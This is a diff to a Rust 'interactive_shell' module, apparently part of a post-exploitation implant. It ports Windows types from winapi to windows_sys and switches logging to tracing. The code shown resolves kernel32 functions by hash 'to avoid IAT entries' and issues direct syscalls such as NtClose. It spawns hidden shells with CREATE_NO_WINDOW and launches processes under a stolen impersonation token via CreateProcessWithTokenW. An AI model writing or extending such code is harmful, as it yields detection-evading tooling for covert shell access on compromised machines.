@@ -35,6 +35,7 @@
 //! compiles on all platforms but only provides real shell spawning on Windows
 //! and Unix.
 
+use common::lock::MutexExt;
 use std::ffi::c_void;
 use std::sync::atomic::{AtomicBool, Ordering};
 use std::sync::{Mutex, OnceLock};
@@ -55,9 +56,16 @@ unsafe fn get_last_error() -> u32 {
     if let Some(func) = fn_ptr {
         func()
     } else {
-        // Fallback: read TEB directly (x86_64 Windows)
+        // Fallback: read TEB directly (LastErrorValue at TEB+0x68).
         let teb: *mut u8;
-        std::arch::asm!("mov {}, gs:[0x30]", out(reg) teb);
+        #[cfg(target_arch = "x86_64")]
+        {
+            std::arch::asm!("mov {}, gs:[0x30]", out(reg) teb);
+        }
+        #[cfg(target_arch = "aarch64")]
+        {
+            std::arch::asm!("mrs {}, tpidr_el0", out(reg) teb);
+        }
         std::ptr::read_volatile(teb.add(0x68) as *const u32)
     }
 }
@@ -97,7 +105,7 @@ struct ShellSession {
 /// Platform-specific process representation.
 #[cfg(windows)]
 struct PlatformProcess {
-    handle: winapi::shared::ntdef::HANDLE,
+    handle: crate::win_types::HANDLE,
     pid: u32,
 }
 
@@ -117,9 +125,9 @@ struct PlatformProcess;
 /// On Windows these are HANDLEs; on Unix they are raw file descriptors.
 #[cfg(windows)]
 struct PlatformPipes {
-    stdin_write: winapi::shared::ntdef::HANDLE,
-    stdout_read: winapi::shared::ntdef::HANDLE,
-    stderr_read: winapi::shared::ntdef::HANDLE,
+    stdin_write: crate::win_types::HANDLE,
+    stdout_read: crate::win_types::HANDLE,
+    stderr_read: crate::win_types::HANDLE,
 }
 
 #[cfg(windows)]
@@ -239,7 +247,7 @@ pub fn create_shell(
         };
     }
 
-    log::info!(
+    tracing::info!(
         "[interactive_shell] created session {} (pid {}, shell={})",
         info.session_id,
         info.pid,
@@ -302,7 +310,7 @@ pub fn close_shell(session_id: u32) -> Result<String, String> {
         let _ = handle.join();
     }
 
-    log::info!("[interactive_shell] closed session {}", session_id);
+    tracing::info!("[interactive_shell] closed session {}", session_id);
     Ok(format!("session {session_id} closed"))
 }
 
@@ -384,11 +392,11 @@ fn default_shell() -> &'static str {
 
 #[cfg(windows)]
 fn spawn_shell_process(shell_path: &str) -> Result<(PlatformProcess, PlatformPipes), String> {
-    use winapi::shared::minwindef::{DWORD, TRUE};
+    use crate::win_types::{DWORD, TRUE};
 
-    use winapi::um::processthreadsapi::{PROCESS_INFORMATION, STARTUPINFOW};
-    use winapi::um::winbase::{CREATE_NO_WINDOW, STARTF_USESTDHANDLES};
-    use winapi::um::winnt::HANDLE;
+    use crate::win_types::{PROCESS_INFORMATION, STARTUPINFOW};
+    use windows_sys::Win32::System::Threading::{CREATE_NO_WINDOW, STARTF_USESTDHANDLES};
+    use crate::win_types::HANDLE;
 
     // Dynamically resolve kernel32 functions to avoid IAT entries.
     let k32 = unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) }
@@ -399,9 +407,9 @@ fn spawn_shell_process(shell_path: &str) -> Result<(PlatformProcess, PlatformPip
         unsafe { pe_resolve::get_proc_address_by_hash(k32, pe_resolve::hash_str(b"CreatePipe\0")) }
             .ok_or_else(|| "could not resolve CreatePipe".to_string())?;
     type CreatePipeFn = unsafe extern "system" fn(
-        *mut winapi::shared::ntdef::HANDLE,               // hReadPipe
-        *mut winapi::shared::ntdef::HANDLE,               // hWritePipe
-        *mut winapi::um::minwinbase::SECURITY_ATTRIBUTES, // lpPipeAttributes
+        *mut crate::win_types::HANDLE,               // hReadPipe
+        *mut crate::win_types::HANDLE,               // hWritePipe
+        *mut crate::win_types::SECURITY_ATTRIBUTES, // lpPipeAttributes
         DWORD,                                            // nSize
     ) -> i32; // BOOL
     let create_pipe: CreatePipeFn = unsafe { std::mem::transmute(create_pipe_addr) };
@@ -464,8 +472,8 @@ fn spawn_shell_process(shell_path: &str) -> Result<(PlatformProcess, PlatformPip
     let mut stderr_read: HANDLE = std::ptr::null_mut();
     let mut stderr_write: HANDLE = std::ptr::null_mut();
 
-    let mut sa: winapi::um::minwinbase::SECURITY_ATTRIBUTES = unsafe { std::mem::zeroed() };
-    sa.nLength = std::mem::size_of::<winapi::um::minwinbase::SECURITY_ATTRIBUTES>() as DWORD;
+    let mut sa: crate::win_types::SECURITY_ATTRIBUTES = unsafe { std::mem::zeroed() };
+    sa.nLength = std::mem::size_of::<crate::win_types::SECURITY_ATTRIBUTES>() as DWORD;
     sa.bInheritHandle = TRUE;
     sa.lpSecurityDescriptor = std::ptr::null_mut();
 
@@ -539,7 +547,7 @@ fn spawn_shell_process(shell_path: &str) -> Result<(PlatformProcess, PlatformPip
     let current_token = crate::token_manipulation::get_current_token();
     let creation_result = if !current_token.is_null() && create_process_with_token_w.is_some() {
         // Use CreateProcessWithTokenW to inherit the impersonation token.
-        use winapi::um::winbase::LOGON_WITH_PROFILE;
+        use windows_sys::Win32::System::Threading::LOGON_WITH_PROFILE;
         let cpwtw = create_process_with_token_w.unwrap();
 
         let result = unsafe {
@@ -557,7 +565,7 @@ fn spawn_shell_process(shell_path: &str) -> Result<(PlatformProcess, PlatformPip
         };
 
         if result == 0 {
-            log::warn!(
+            tracing::warn!(
                 "[interactive_shell] CreateProcessWithTokenW failed (err {}), falling back to CreateProcessW",
                 unsafe { get_last_error() }
             );
@@ -681,12 +689,12 @@ fn spawn_shell_process(shell_path: &str) -> Result<(PlatformProcess, PlatformPip
 
 #[cfg(windows)]
 fn close_all_handles(
-    a: winapi::shared::ntdef::HANDLE,
-    b: winapi::shared::ntdef::HANDLE,
-    c: winapi::shared::ntdef::HANDLE,
-    d: winapi::shared::ntdef::HANDLE,
-    e: winapi::shared::ntdef::HANDLE,
-    f: winapi::shared::ntdef::HANDLE,
+    a: crate::win_types::HANDLE,
+    b: crate::win_types::HANDLE,
+    c: crate::win_types::HANDLE,
+    d: crate::win_types::HANDLE,
+    e: crate::win_types::HANDLE,
+    f: crate::win_types::HANDLE,
 ) {
     unsafe {
         let _ = crate::syscall!("NtClose", a as u64);
@@ -707,7 +715,7 @@ fn write_to_pipe(pipes: &PlatformPipes, data: &[u8]) -> Result<(), String> {
         unsafe { pe_resolve::get_proc_address_by_hash(k32, pe_resolve::hash_str(b"WriteFile\0")) }
             .ok_or_else(|| "could not resolve WriteFile".to_string())?;
     type WriteFileFn = unsafe extern "system" fn(
-        winapi::shared::ntdef::HANDLE, // hFile
+        crate::win_types::HANDLE, // hFile
         *const c_void,                 // lpBuffer
         u32,                           // nNumberOfBytesToWrite
         *mut u32,                      // lpNumberOfBytesWritten
@@ -734,8 +742,8 @@ fn write_to_pipe(pipes: &PlatformPipes, data: &[u8]) -> Result<(), String> {
 }
 
 #[cfg(windows)]
-fn read_from_pipe(handle: winapi::shared::ntdef::HANDLE) -> Option<Vec<u8>> {
-    use winapi::shared::minwindef::DWORD;
+fn read_from_pipe(handle: crate::win_types::HANDLE) -> Option<Vec<u8>> {
+    use crate::win_types::DWORD;
 
     // Dynamically resolve PeekNamedPipe and ReadFile from kernel32 to avoid IAT entries.
     let k32 = unsafe { pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL) }?;
@@ -743,7 +751,7 @@ fn read_from_pipe(handle: winapi::shared::ntdef::HANDLE) -> Option<Vec<u8>> {
         pe_resolve::get_proc_address_by_hash(k32, pe_resolve::hash_str(b"PeekNamedPipe\0"))
     }?;
     type PeekNamedPipeFn = unsafe extern "system" fn(
-        winapi::shared::ntdef::HANDLE, // hNamedPipe
+        crate::win_types::HANDLE, // hNamedPipe
         *mut c_void,                   // lpBuffer
         u32,                           // nBufferSize
         *mut u32,                      // lpBytesRead
@@ -755,7 +763,7 @@ fn read_from_pipe(handle: winapi::shared::ntdef::HANDLE) -> Option<Vec<u8>> {
     let read_file_addr =
         unsafe { pe_resolve::get_proc_address_by_hash(k32, pe_resolve::hash_str(b"ReadFile\0")) }?;
     type ReadFileFn = unsafe extern "system" fn(
-        winapi::shared::ntdef::HANDLE, // hFile
+        crate::win_types::HANDLE, // hFile
         *mut c_void,                   // lpBuffer
         u32,                           // nNumberOfBytesToRead
         *mut u32,                      // lpNumberOfBytesRead
@@ -1015,7 +1023,7 @@ fn resize_pty(session: &ShellSession, cols: u16, rows: u16) -> Result<(), String
             std::io::Error::last_os_error()
         ));
     }
-    log::debug!(
+    tracing::debug!(
         "[interactive_shell] PTY resized for session {} to {}x{}",
         session.session_id,
         cols,
@@ -1109,7 +1117,7 @@ fn spawn_readers(
     std::thread::Builder::new()
         .name(format!("bg-{session_id}"))
         .spawn(move || {
-            log::debug!("[interactive_shell] reader thread started for session {session_id}");
+            tracing::debug!("[interactive_shell] reader thread started for session {session_id}");
 
             loop {
                 if stop.load(Ordering::SeqCst) {
@@ -1128,7 +1136,7 @@ fn spawn_readers(
                     let stdout_data = {
                         #[cfg(windows)]
                         {
-                            read_from_pipe(stdout_handle as winapi::shared::ntdef::HANDLE)
+                            read_from_pipe(stdout_handle as crate::win_types::HANDLE)
                         }
                         #[cfg(unix)]
                         {
@@ -1151,7 +1159,7 @@ fn spawn_readers(
                     #[cfg(windows)]
                     {
                         let stderr_data =
-                            read_from_pipe(stderr_handle as winapi::shared::ntdef::HANDLE);
+                            read_from_pipe(stderr_handle as crate::win_types::HANDLE);
 
                         if let Some(data) = stderr_data {
                             let text = String::from_utf8_lossy(&data).to_string();
@@ -1168,7 +1176,7 @@ fn spawn_readers(
                     // dies (exit, crash, killed) there's no more data coming,
                     // so stop the reader to avoid leaking a thread.
                     if !is_process_alive(&child_process) {
-                        log::info!("interactive_shell: child process exited, stopping reader");
+                        tracing::info!("interactive_shell: child process exited, stopping reader");
                         break;
                     }
                 }
@@ -1177,7 +1185,7 @@ fn spawn_readers(
                 std::thread::sleep(std::time::Duration::from_millis(50));
             }
 
-            log::debug!("[interactive_shell] reader thread stopped for session {session_id}");
+            tracing::debug!("[interactive_shell] reader thread stopped for session {session_id}");
         })
         .expect("failed to spawn shell reader thread")
 }
@@ -1197,7 +1205,7 @@ mod tests {
     #[test]
     fn manager_initializes() {
         let mgr = manager();
-        let inner = mgr.lock().unwrap();
+        let inner = mgr.lock_recover();
         // next_id should always be >= 1 (even if another test created a session).
         assert!(inner.next_id >= 1, "next_id should start at 1 or higher");
     }
